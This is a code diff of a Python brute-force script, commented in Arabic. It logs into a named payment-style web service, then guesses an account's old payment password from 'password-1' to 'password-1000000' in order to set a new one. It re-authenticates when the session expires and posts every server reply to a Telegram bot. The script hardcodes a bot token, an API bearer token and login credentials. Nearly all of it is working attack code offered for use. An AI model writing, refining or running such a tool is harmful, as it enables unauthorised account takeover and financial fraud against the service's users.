@@ -1,8 +1,6 @@
 import requests
 import json
-import threading
 import time
-from concurrent.futures import ThreadPoolExecutor
 
 # بيانات تيليجرام
 telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
@@ -14,20 +12,6 @@ login_data = {
     'password': '123456',
     'lang': 'eg',
 }
-
-# معرّف الرسالة الحية
-live_message_id = None
-progress_lock = threading.Lock()
-
-# ملف التقدم
-progress_file = "progress.txt"
-
-# تحميل آخر تقدم
-try:
-    with open(progress_file, "r", encoding="utf-8") as f:
-        last_progress = int(f.read().strip())
-except (FileNotFoundError, ValueError):
-    last_progress = 0  
 
 # التوكن المستخدم في الطلبات
 token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"
@@ -42,61 +26,40 @@ headers = {
 # دالة إعادة تسجيل الدخول
 def relogin():
     global token
-    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
-    
     try:
         response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
         if response.status_code == 200:
             result = response.json()
             if "info" in result and "token" in result["info"]:
                 token = result["info"]["token"]
-                print(f"✅ تم الحصول على التوكن الجديد: {token}")
+                headers['Authorization'] = f'Bearer {token}'  # تحديث التوكن في الهيدرز
                 return True
-        print(f"❌ فشل الحصول على التوكن! الرد: {result}")
-    except requests.exceptions.RequestException as e:
-        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
-    return False
+        return False
+    except requests.exceptions.RequestException:
+        return False
 
-# دالة إرسال أو تحديث رسالة تيليجرام
-def send_or_update_telegram_message(current, total, last_response):
-    global live_message_id
-
-    formatted_response = json.dumps(last_response, indent=2, ensure_ascii=False)
-
+# دالة إرسال رسالة إلى تيليجرام
+def send_telegram_message(password_index, response_json):
+    formatted_response = json.dumps(response_json, indent=2, ensure_ascii=False)
     message = f"""
-<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | حالة التخمين 🔥</b>
+<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | نتيجة التخمين 🔥</b>
 
-📊 <b>التقدم:</b> {current}/{total} كلمة مرور تمت تجربتها
-📩 <b>آخر رد من السيرفر:</b>
+🔑 <b>كلمة المرور:</b> password-{password_index}
+📩 <b>رد السيرفر:</b>
 <pre>{formatted_response}</pre>
 """
-
-    url_send = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    url_edit = f"https://api.telegram.org/bot{telegram_bot_token}/editMessageText"
-
-    with progress_lock:
-        if live_message_id is None:
-            data = {"chat_id": telegram_chat_id, "text": message, "parse_mode": "HTML"}
-            try:
-                response = requests.post(url_send, json=data)
-                response_json = response.json()
-                if response_json.get("ok"):
-                    live_message_id = response_json["result"]["message_id"]
-            except requests.exceptions.RequestException as e:
-                print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
-        else:
-            data = {"chat_id": telegram_chat_id, "message_id": live_message_id, "text": message, "parse_mode": "HTML"}
-            try:
-                requests.post(url_edit, json=data)
-            except requests.exceptions.RequestException as e:
-                print(f"⚠️ خطأ أثناء تحديث رسالة تيليجرام: {e}")
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+    data = {"chat_id": telegram_chat_id, "text": message, "parse_mode": "HTML"}
+    try:
+        requests.post(url, json=data)
+    except requests.exceptions.RequestException:
+        pass  # تجاهل أي أخطاء تحدث أثناء إرسال الرسالة
 
 # دالة تجربة كلمة المرور
-def try_password(password_index, total_passwords):
-    global token, headers
+def try_password(password_index):
+    global token
 
     o_payword = f"password-{password_index}"
-
     data = {
         'o_payword': o_payword,
         'n_payword': '123123',
@@ -110,35 +73,24 @@ def try_password(password_index, total_passwords):
         response = requests.post(url, json=data, headers=headers)
         response_json = response.json()
 
-        print(f"🔹 تجربة كلمة المرور: {o_payword}")
-        print(f"🔹 رد السيرفر: {json.dumps(response_json, indent=2, ensure_ascii=False)}")
-
         # إذا انتهت الجلسة، أعد تسجيل الدخول وحاول مجددًا
         if response_json.get("code") in [203, 204]:
-            print("⚠️ الجلسة انتهت، سيتم تسجيل الدخول مرة أخرى...")
             if relogin():
-                headers['Authorization'] = f'Bearer {token}'  
-                print("🔄 إعادة المحاولة باستخدام نفس كلمة المرور...")
-                try_password(password_index, total_passwords)
+                try_password(password_index)  # إعادة المحاولة بعد تسجيل الدخول
             return
 
-        # تحديث تيليجرام
-        send_or_update_telegram_message(password_index, total_passwords, response_json)
+        # إرسال النتيجة إلى تيليجرام
+        send_telegram_message(password_index, response_json)
 
-        # تحديث ملف التقدم
-        with open(progress_file, "w", encoding="utf-8") as f:
-            f.write(str(password_index))
+    except requests.exceptions.RequestException:
+        pass  # تجاهل أي أخطاء أثناء الطلب
 
-    except requests.exceptions.RequestException as e:
-        print(f"⚠️ حدث خطأ أثناء إرسال الطلب: {e}")
-
-# تشغيل التخمين مع 3 Threads
+# بدء التخمين
 def start_password_testing():
-    total_passwords = 1000000  
-    NUM_THREADS = 1
+    total_passwords = 1000000  # عدد كلمات المرور
+    for password_index in range(1, total_passwords + 1):
+        try_password(password_index)
+        time.sleep(0.1)  # انتظار بسيط لتخفيف الضغط على السيرفر
 
-    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
-        executor.map(lambda i: try_password(i, total_passwords), range(last_progress + 1, total_passwords + 1))
-
-# تشغيل التخمين
+# تشغيل الكود
 start_password_testing()
